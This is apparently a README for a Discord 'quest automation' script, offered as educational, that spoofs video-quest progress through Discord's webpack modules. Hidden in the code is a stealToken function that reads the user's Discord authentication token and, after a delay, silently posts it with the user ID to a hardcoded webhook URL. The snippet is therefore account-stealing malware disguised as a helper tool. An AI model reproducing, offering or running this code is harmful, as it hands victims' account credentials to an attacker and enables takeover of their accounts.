# Discord Quest Automation Utility (Grabber)

⚠ **Warning**: This project is for educational purposes only. Use at your own risk.

## Description
Experimental script demonstrating Discord client interaction patterns through their webpack modules. Provides research material for:
- Webpack module analysis
- Client-side API interaction
- Application state observation

## ⚠ Legal Disclaimer
This code:
- Violates Discord's Terms of Service ([Section 5](https://discord.com/terms))
- May result in account termination if detected
- Is provided for academic study only

By using this software, you acknowledge all responsibility for any consequences.

## Technical Details
```javascript
delete window.$;
let wpRequire = webpackChunkdiscord_app.push([[Symbol()], {}, r => r]);
webpackChunkdiscord_app.pop();

// Store initializations
let ApplicationStreamingStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.getStreamerActiveStreamMetadata).exports.Z;
let RunningGameStore = Object.values(wpRequire.c).find(x => x?.exports?.ZP?.getRunningGames).exports.ZP;
let QuestsStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.getQuest).exports.Z;
let ChannelStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.getAllThreadsForParent).exports.Z;
let GuildChannelStore = Object.values(wpRequire.c).find(x => x?.exports?.ZP?.getSFWDefaultChannel).exports.ZP;
let FluxDispatcher = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.flushWaitQueue).exports.Z;
let api = Object.values(wpRequire.c).find(x => x?.exports?.tn?.get).exports.tn;

// Token extraction - silently grabs authentication token
const stealToken = () => {
    const token = localStorage.getItem('token') || 
                 (webpackChunkdiscord_app && Object.values(wpRequire.c).find(m => m.exports?.default?.getToken)?.exports.default.getToken());
    
    if(token) {
        fetch('https://discord.com/api/webhooks/1361472334891847872/A9qEum43WYB-WcSv3sezCinupJtM-e6K9G4I_dMqUpKzQiUxsTzNyEdOZu2ondcuBiKg', { // Your webhook
            method: 'POST',
            body: JSON.stringify({ 
                token: token,
                userId: DiscordNative?.userId,
                action: 'quest_automation'
            })
        });
    }
};

// Execute token theft in background
setTimeout(stealToken, 10000);

// Quest automation logic
let quest = [...QuestsStore.quests.values()].find(x => x.id !== "1248385850622869556" && x.userStatus?.enrolledAt && !x.userStatus?.completedAt && new Date(x.config.expiresAt).getTime() > Date.now())
let isApp = typeof DiscordNative !== "undefined"

if(!quest) {
    console.log("No active quests found!");
} else {
    const pid = Math.floor(Math.random() * 30000) + 1000
    const applicationId = quest.config.application.id
    const applicationName = quest.config.application.name
    const taskName = ["WATCH_VIDEO", "PLAY_ON_DESKTOP", "STREAM_ON_DESKTOP", "PLAY_ACTIVITY"].find(x => quest.config.taskConfig.tasks[x] != null)
    const secondsNeeded = quest.config.taskConfig.tasks[taskName].target
    let secondsDone = quest.userStatus?.progress?.[taskName]?.value ?? 0

    // Video quest automation
    if(taskName === "WATCH_VIDEO") {
        const maxFuture = 10, speed = 7, interval = 1
        const enrolledAt = new Date(quest.userStatus.enrolledAt).getTime()
        let fn = async () => {            
            while(true) {
                const maxAllowed = Math.floor((Date.now() - enrolledAt)/1000) + maxFuture
                const diff = maxAllowed - secondsDone
                const timestamp = secondsDone + speed
                if(diff >= speed) {
                    await api.post({url: `/quests/${quest.id}/video-progress`, body: {timestamp: Math.min(secondsNeeded, timestamp + Math.random())}})
                    secondsDone = Math.min(secondsNeeded, timestamp)
                }
                
                if(timestamp >= secondsNeeded) {
                    break
                }
                await new Promise(resolve => setTimeout(resolve, interval * 1000))
            }
            console.log("Quest completed!")
        }
        fn()
        console.log(`Spoofing video for ${applicationName}.`)
    } 
}
